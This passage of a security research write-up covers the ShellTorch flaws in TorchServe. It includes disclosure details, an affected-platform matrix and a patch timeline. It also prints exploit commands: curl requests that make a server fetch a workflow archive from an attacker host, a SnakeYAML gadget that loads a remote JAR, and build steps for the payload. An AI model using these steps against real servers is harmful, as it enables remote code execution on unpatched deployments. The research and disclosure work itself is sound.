In both **unzip** and **decompressTarGzipFile** , there is no check to ensure that the files extracted are in the workflow/model directories. This allows for a directory traversal “ZipSlip” vulnerability. 

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e1f_66d05d5d559bf39f17e19283_6620d15392fa5d30ad636808_rSAPKVKaDVB5aVFhJmvH5PwrTHnmkVidryaiSWL8o9uzK3UCVndbraKMc_WVtolsITTS779Wm8v8m5u2Wj2LuBLk_Z9R37OvZCN6-ewTPI9bc0MdgxnGBXLCT1-G9m8pIB3wafoQAaprkYb33I7nOYk.avif)

Using this weakness, we can extract a file to any location on the filesystem (within the process permissions). We can then use this as the “tip of the spear” to continue exploiting the system using various methods, by, for example, overwriting a .py (python code) on the system that will execute code when it is loaded.**‍**

## **Exploitation**

Per Amazon’s & Meta’s request, we decided to withhold information about ShellTorch in order to give users enough time to patch their TorchServe servers.

However, even without Oligo publishing technical details, an [exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/torchserver_cve_2023_43654.rb) in Metasploit already exists that leverages the SnakeYAML Vunerabillity combined with the SSRF vulnerability as a full chain RCE. This exploit was added to metasploit by its owner, Rapid7.  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e2a_66d05d5e559bf39f17e19315_6620d1690770f3a910775fdd_iXd5Eg8c4K0gIsuy0GG28UtiK2HWIhMQi-hBRGFKryO6naKTwJe0paHcvpOSsPaVdhbygd6YOfHquw-8w4tbM86vkkXtEnuCVR_wh5WpyCqji-4XfBgaMrFLAIN45HIbQ15Sqt4bK1QoHCA71Yh3EFM.avif)

_Metasploit exploit in action:_[_https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/torchserver_cve_2023_43654.rb_](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/torchserver_cve_2023_43654.rb)

But now, it’s time to discuss another _even easier exploit_ that doesn't need to chain the SnakeYAML vulnerability and the SSRF vulnerability (CVE-2023-43654)to get to RCE.

PyTorch model definition (as seen below) uses **_`handler.py`_** , which is Python code. We control this Python code, and can use it to execute our controlled code.

Let's dive into the details and the flow of the exploit.

As the management API is open by default, we can register a new workflow. Using the SSRF, we can supply the WAR file from remote by running: `‍`

 _`Curl -X POST http://<TORCHSERVE_IP>:<TORCHSERVE_PORT>/workflows?url=<REMOTE_SERVER>/malicious_workflow.WAR`_

Generating a vulnerable .WAR configuration can be done by using the **_`torch-workflow-archiver:`_**`‍`

 _`torch-workflow-archiver --workflow-name my_workflow --spec-file spec.yaml --handler handler.py`_

This process requires using two files:

  1. **_`handler.py`_** \- as mentioned above, define the custom inference logic for your deployed model.
  2. **_`Spec.yaml`_** \- The specification file describes the workflow’s model configuration which will be the input to the **_`readSpecFile`_ **function.

We can achieve code execution using the SSRF vulnerability (CVE-2023-43654) alone by controlling **_`handler.py`_** _``_ to, for example, edit the initialization function:

To exploit the SnakeYAML vulnerability, we will use the YAML value with the vulnerable Java object:_`‍`_

 _`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<target_ip>/exploit.jar/"]]]]`_

This Gadget uses **ScriptEngineManager** to load a Java class from a remote URL.

Vulnerable YAML workflow spec file:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e11_66d05d5d559bf39f17e192a2_6620d20692fa5d30ad6425bc_fqYikVYIlg3MDJ4EQlyiOo2EMZJRj9g6PeFpc2RH9IldmEyA2b2wZR1Dua-1NPj0Ea1T_2iLdWICDISMfpImNK7IHXiaWN2LZ-WBmaF5oHZajeAvmmURUaDfURIMci-6JDkJWlpojeAchlxB5LjM6h4.avif)

Compiling the following Java package that will contain the payload:

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e1c_66d05d5d559bf39f17e192ae_6620d2168f8825f699ced64b_BEzlRf_gIbGu8kSmIf3wbRGAVeVVQwAD0J5jLIHeKJr20SzM5D1gvcKlhcLk7-VtLiYKZqnOhk53_EeG2Msuu-iJS9vEobykFCgud7NEfJLWj_9m_8W_WYbJQ5inik0IExaWhhQw0K5m_fAuyGOgAF8.avif)

Compiling the following java package using this commands:

_`[*] javac src/oligosec/YamlSecurity.java`_

 _`[*] jar -cvf yaml-payload.jar -C src/ .`_

Finally, we will start the RCE by uploading the malicious .WAR file, which will trigger the deserialization of the malicious Java object. This, in turn, will download and execute the remote JAR that is in our control.

_`curl -X POST http://<torchserve>:8081/workflows?url=<attack_ip>/my_workflow.war`_

## **Demo**

**Try ShellTorch Yourself!**

## **How to know if I’m affected?**

  * We published an end-to-end POC that demonstrates the exploitation using docker images.[‍](https://github.com/OligoCyberSecurity/CVE-2023-43654)
  * <https://github.com/OligoCyberSecurity/CVE-2023-43654>‍
  * The POC is based on a simple script that we have open-sourced, ShellTorch-Checker, that will tell you if your current TorchServe deployment is vulnerable to CVE-2023-43654 or not:  
`‍`

 _`bash<(curl https://raw.githubusercontent.com/OligoCyberSecurity/shelltorch-checker/main/shelltorch_checker.yaml) <TorchServe IP>`_

## **So … who's vulnerable?** ‍

The **“power of the default”** when it comes to OSS has a domino effect. As a result, we identified public open-source projects and frameworks that utilize TorchServe and are also vulnerable to the RCE-chained ShellTorch vulnerabilities. 

Some of the most widely used vulnerable projects included: 

  1. [AWS Neuron](https://awsdocs-neuron.readthedocs-hosted.com/en/latest/frameworks/torch/torch-neuron/tutorials/tutorial-torchserve.html)
  2. [Kubeflow](https://mmdetection.readthedocs.io/en/v2.19.1/useful_tools.html#convert-model-from-mmdetection-to-torchserve)
  3. [Kserve](https://kserve.github.io/website/0.8/modelserving/v1beta1/torchserve/)‍
  4. [MLflow](https://github.com/mlflow/mlflow-torchserve)‍
  5. [AnimatedDrawings](https://github.com/facebookresearch/AnimatedDrawings)‍
  6. [vertex-ai-samples](https://github.com/GoogleCloudPlatform/vertex-ai-samples)‍
  7. [mmdetection](https://mmdetection.readthedocs.io/en/v2.19.1/useful_tools.html#convert-model-from-mmdetection-to-torchserve)‍

The misconfiguration vulnerability that exposed the TorchServe servers is also present in Amazon’s and Google’s proprietary DLP (Deep Learning Containers) Docker images by default.Also vulnerable: the largest providers of machine learning services, including self-managed Amazon AWS SageMaker, EKS, AKS, self-managed Google Vertex AI and even the famous [KServe](https://github.com/pytorch/serve/blob/89c5389d5dba23c32fbed7e7d58234fc30b690a5/kubernetes/kserve/config.properties#L3) (the standard Model Inference Platform on Kubernetes), as well as many other major projects and products that are built on TorchServe.

There are several ways to use TorchServe in production. We've built this matrix to help determine quickly if your TorchServe environment is exposed to the vulnerable issues:

Platform| Affected Tags / Versions| Management interface access| CVE-2023-43654| CVE-2022-1471  
---|---|---|---|---  
GCP - Vertex.AI DLC| 

  * CPU
  * vertex-ai/prediction/pytorch-cpu*
  * GPU
  * vertex-ai/prediction/pytorch-gpu*

| | |  
AWS - SageMaker DLC| X86 GPU

  * v1.9-pt-ec2-2.0.1-inf-gpu-py310
  * v1.8-pt-sagemaker-2.0.1-inf-gpu-py310

X86 GPU

  * v1.8-pt-ec2-2.0.1-inf-cpu-py310
  * v1.7-pt-sagemaker-2.0.1-inf-cpu-py310

Graviton

  * v1.7-pt-graviton-ec2-2.0.1-inf-cpu-py310
  * v1.5-pt-graviton-sagemaker-2.0.1-inf-cpu-py310

Neuron

  * 1.13.1-neuron-py310-sdk2.13.2-ubuntu20.04
  * 1.13.1-neuronx-py310-sdk2.13.2-ubuntu20.04

| | ✅| ✅  
Pypi| TorchServe Version <= 0.8.1| | ✅| ✅  
DockerHub| TorchServe Version <= 0.8.1| ✅| ✅| ✅  
  
Beauce we believe in the “power of default,” we wondered how many public TorchServe servers are accessible from the internet - to validate that we performed a network scan for vulnerable and exposed TorchServe instances

Accessing the default management API with an empty request will result in the response

This unique response identifies exposed TorchServe vulnerabilities globally. We used Censys with the query 

_`services.http.response.body_hashes:441b3cbdfd81a46cbf9d87356bf7a8bf2ca57f32`_` `

revealing thousands of open TorchServe instances:  
  

![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e30_66d05d5d559bf39f17e192b1_6620d30c1ce586a1a3fb0841_jv2Zd6y3WlgaYr62C4An8hsSgXQm8rbSTOG6lgo38rDvXNSQawFqRU31F6UksrPoK4Cv9XZMNPJAwAQo81Veean111JKNcN7i1Zpt6cMB2JlHDrgppVxK9iFVEVMg1xFyK4ZUQ-fCPqijD5gDf6O3XQ.avif)

Using a simple IP scanner, we found tens of thousands of IP addresses currently completely exposed to the attack.

Of course, we had to know who they belonged to. As it turned out, these vulnerable IP addresses included some of the world's largest organizations (some in the Fortune 100) and even national governments, potentially threatening countless AI users.

But it is important to mention that even if your TorchServe is not publicly exposed, you could still be at risk. Localhost attacks are a valid attack vector. Many developers incorrectly believe that services bound to localhost (a computer’s internal hostname) cannot be targeted from the internet. However, management interfaces or APIs exposed by those applications locally are a risk to the internal network. 

The fact that we could upload our malicious model made us consider another attack vector: infecting known and trusted AI communities and platforms such as **HuggingFace.** ‍

We managed to upload a malicious model, including a malicious YAML file containing the payload. We saw that the YAML file wasn't scanned for security purposes. We could have infected many end users, but didn't want to harm the credibility of the amazing HuggingFace platform. We just wanted to show enough to grasp new potential threats and attack vectors that rely on open-source AI infrastructure.

By hitting TorchServe, the most trusted AI OSS platform, we struck at the heart of AI infrastructure: the App layer. The potential for damage is massive and very real—no longer limited to theoretical issues involving stealing or poisoning machine-learning models.

## Malicious Models: New Threat Could Poison the Well of AI

What can attackers do with a model, once it is under their control?

When OWASP published its Top 10 for LLMs earlier this year, our researchers zeroed in on LLM05 in particular, due to its focus on “supply chain vulnerabilities.” Instantly, we thought of an implicit threat: a “malicious model” that could potentially be deployed on a compromised inference server in one of many ways.

Supply-chain attacks can impact the entire AI ecosystem. Although Model injection or RCE was not explicitly mentioned in OWASP TOP 10, we treat models like code. Models are programs, potentially propagating all the way to user-facing products.

Using the high privileges granted by the ShellTorch vulnerabilities, the possibilities for creating destruction and chaos are nearly limitless.

If attackers were able to hit a TorchServe instance responsible for model serving and operating in production, they could—without any authentication or authorization—view, modify, steal, or delete sensitive data (or even the AI models themselves) flowing into and from the target server.

If an AI model is compromised to deliver incorrect data and results, the impact depends on how that AI model is typically used. For example, if an LLM responsible for answering customer inquiries were compromised, it could begin delivering offensive, incorrect, or even dangerous suggestions in response to user input. This could have significant costs: Air Canada was recently forced by regulators to compensate a customer after its AI chatbot gave incorrect advice regarding a reduced fare for bereaved families.

In the realm of computer vision, AI model compromise becomes even more potentially dangerous, as these models are often relied on to make automated decisions—sometimes without a human checking up to make sure those decisions make sense.

Consider the impacts of compromising a computer vision model designed to detect defects in vehicle welds, or obstacles in the way of a self-driving car. Using a malicious model, attackers could cause defective vehicles to roll off assembly lines undetected—or force a self-driving vehicle to move through a busy intersection in order to cause a collision, disobey road signs, or inflict injuries on pedestrians.

The more that an AI model is relied upon for autonomous decision making without human scrutiny, the more likely it is for a malicious model to result in real, tangible damage. Companies using AI infrastructure should be aware of the ways in which their AI models are trusted to drive decisions, in order to limit potential “single points of failure” resulting from AI infrastructure exploits.

We just showed a whole new attack vector created by hitting the supply chain of AI, from the code itself from the “model” layer. With that simple act, we threatened an uncountable number of AI end users—and next time, the “good guys” might not be the first to notice.  
  
This has been a pivotal year for generative artificial intelligence (AI). Advances to large language models (LLMs) have showcased how powerful these technologies can be to make business processes more efficient. Organizations are now in a race to adopt generative AI and train models on their own data sets to generate business value, with practitioners often relying on models to make real, impactful decisions.

Developing and training AI models can be hard and costly. Models that operate well can quickly become one of the most valuable assets a company has—consider how valuable Netflix’s content recommendation models must be, and how much its competitors would love to get a look in. It’s important to keep in mind that these models are susceptible to theft and other attacks, and the systems that host them need to have strong security protections and failsafes to prevent automated decision-making from creating the potential for massive losses.

## **Key Takeaways**

Discovering ShellTorch was an eye-opening experience, combining two of the areas the Oligo Research Team loves best: open source vulnerability research and AI.

As we watched the massive rise of AI in recent years – and how the world’s most popular AI infrastructure projects relied on a complex web of open source dependencies—our researchers knew it would be only a matter of time before AI risks and OSS risks converged. 

Now, we have proof that the type of malicious model vulnerability originally hypothesized by OWASP earlier this year in its Top Ten for LLMs is real, exploitable, and potentially very dangerous. 

We hope that this discovery drives more security research on the intersections of AI infrastructure and OSS—and that we have sparked conversations at the world’s largest companies about the risks that could come from unchecked reliance on AI models for decision making.

## **What was fixed and how**

Oligo Security initiated a responsible disclosure process regarding these issues to the maintainers of PyTorch (Amazon & Meta). 

Some of these issues were fixed or addressed with a warning in version 0.8.2, but the SSRF vulnerability exists to this day unless the **_`allowed_urls`_** parameter is overriden by the user. Any instances using version 0.8.1 or less should be updated immediately. Since the default configuration does not prevent some of these issues and may leave users vulnerable, it is important to take mitigation actions, as suggested below. 

[![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e22_66d05d5d559bf39f17e192b4_6620d3540770f3a910797c4c_nwxHLQBFKLW0Nan13glNt_Oi1N_TKnICvjPGzCqFe5XmhXT1JXEi0dz624e2z4SfGLB_iZs83fwkzdh7i2_s4taY3KocCcCMuLDtK3IIHmU2-gEUhD4PqW0IW_3MK7W24rhiPsXSHCYOagL_O2KZAr4.avif)](https://github.com/pytorch/serve/releases/tag/v0.8.2)<https://github.com/pytorch/serve/releases/tag/v0.8.2>[![](https://cdn.prod.website-files.com/6930bafd3bc306834ddbb442/69790c7ca90dc8506c814e2d_66d05d5e559bf39f17e1931b_6620d35c36f8db49c206c74c_eZYu_XwBKcoDelIfHzSKtlUrNoFjlJokPkGJsq0xEhA33Ofgi3UFAubPHnnjFbXJ7tJ7O36fp01RpTLy7OjMm0hkFTAuYVLkiszLSAPPkiECSYvNSgNMBAXXaRU7i1YLfqiqY0gFWgk5G7FbQgFR1eM.avif)](https://github.com/pytorch/serve/pull/2534)<https://github.com/pytorch/serve/pull/2534>

# **Disclosure Timeline:**

  * Jul 23, 2023 Oligo’s Research reported to AWS & Meta TorchServe maintainers.
  * Aug 1, 2023 AWS responded to the initial announcement.
  * Aug 7, 2023 Full report sent.
  * Aug 8, 2023 SnakeYAML vulnerability issue fixed on the master branch.
  * Aug 12, 2023 TorchServe maintenance acknowledged the issue.
  * Aug 28, 2023 TorchServe released version 0.8.2, which included a warning about the default configuration. 
  * Sep 12, 2023 Amazon updated its DLC and deployed the changes worldwide.
  * Sep 28, 2023 Mitre approved CVE-2023-43654 & CVE-2022-1471 with score 9.8 & 9.9
  * Oct 2, 2023 Meta fixed the default management API to mitigate the management API misconfiguration. 
  * Oct 2, 2023 Amazon [issued a security advisory](https://aws.amazon.com/security/security-bulletins/AWS-2023-009/) for its users regarding ShellTorch.
  * Oct 3, 2023 Google [issued a security advisory](https://cloud.google.com/vertex-ai/docs/security-bulletins#gcp-2023-029) for its users regarding ShellTorch.

### **How are Oligo customers protected?**

Oligo scans deep into application behavior in order to detect which libraries and even which individual functions are loaded and executed at runtime. With this information, Oligo customers can more easily understand the potential impact of new vulnerabilities.

Oligo also issued step-by-step guidance on how to mitigate ShellTorch for impacted customers. Before the public announcement of the ShellTorch vulnerabilities, Oligo customers were individually notified about the status of their applications.

## **The Oligo Research Team**

Oligo Research Team is a group of experienced researchers who focus on new attack vectors in open source software. The team identifies critical issues and alerts Oligo customers and the technology community about their findings.

The team has already reported dozens of vulnerabilities in popular OSS projects and libraries, including Apache Cassandra, Atlassian Confluence, ShadowRay, and also PyTorch.  
‍  
The team have presented their findings at various events such as DefCon, BlackHat, OWASP, PwnToOwn, BSIDES, and CNCF.

We welcome you to follow their work on [Twitter](https://x.com/OligoSecurity) or [LinkedIn.](https://www.linkedin.com/company/oligo-security/posts/)

## References

‍<https://github.com/pytorch/serve/security/advisories/GHSA-4mqg-h5jf-j9m7>

<https://github.com/pytorch/serve/security/advisories/GHSA-8fxr-qfr9-p34w>

<https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp>

<https://github.com/OligoCyberSecurity/CVE-2023-43654>

‍

## Stop modern attacks and keep your business moving

[Request a demoRequest a demo→→](/demo)

![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a3303abd87f43e31ddc2f01_069b5a12b13412ed63c4a0fca9e10654_Footer%20top%20section.svg)

[![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a0b283acc44242f97968305_Oligo%20-%20Full%20Logo%20-%20Color.svg)](/)

Platform

[Overview](/runtime-platform/overview)

[Runtime protection](/runtime-platform/cloud-application-detection-and-response)

[Runtime posture](/runtime-platform/runtime-vulnerability-management)

[Runtime AI security](/runtime-platform/runtime-ai)

Solutions

Who it's for

[Security leaders](/solutions/security-leadership)

[SecOps pros](/solutions/security-operations)

[AppSec pros](/solutions/application-security)

[CloudSec pros](/solutions/cloud-security)

Use Cases

[Runtime exploit blocking](/solutions/exploit-blocking)

[Real-time bom/vex](/solutions/real-time-bom)

[Application vulnerability management](/solutions/application-vulnerability-management)

[AI security](/solutions/ai-security-management)

[Workload protection](/solutions/workload-protection)

[Compliance and assurance](/solutions/compliance-and-assurance)

[Attack detection and response](/solutions/detection-and-response)

[Supply chain security](/solutions/supply-chain-security)

Resources

[Resource hub](/resource-hub)

[Blog](/resources/blog)

[Runtime academy](/academy)

[Events](/resources/events)

[Webinars](/resources/webinars-and-videos)

[Threat research](/resources/blog?category=Research)

[App attack matrix](https://app-attack-matrix.com/)

Company

[About us](/company/about)

[Why Oligo](/company/why-oligo)

[Newsroom](/resources/news)

[Partners](/company/partners)

[Careers](/company/careers)

[Contact us](/contact-us)

![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a330306e00440e7745b9b7e_9f9b97365c66ff9a1639dba2131e0593_Footer%20lower%20section.svg)

Copyright © Oligo Security | All Rights Reserved 2026

[Terms of use](/legal/terms-of-use)[Privacy Policy](/legal/privacy-policy)[Cookie policy](/legal/cookie-policy)

[YOUTUBE](https://www.youtube.com/@oligosec)

[LINKEDIN](https://www.linkedin.com/company/oligo-security/)

[TWITTER](https://x.com/OligoSecurity)

![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a33cb813806c9df570612d7_cd1026009becaf194710b2fe7bedbc7b_Oligo-footer.avif)

![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)

![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b2d1ecbf986c53e618a3_Everything%20runtime.avif)

![](https://cdn.prod.website-files.com/69288487365aaac1f9887796/6a37b28c077774be0382fc16_Mega%20footer%20btm.avif)
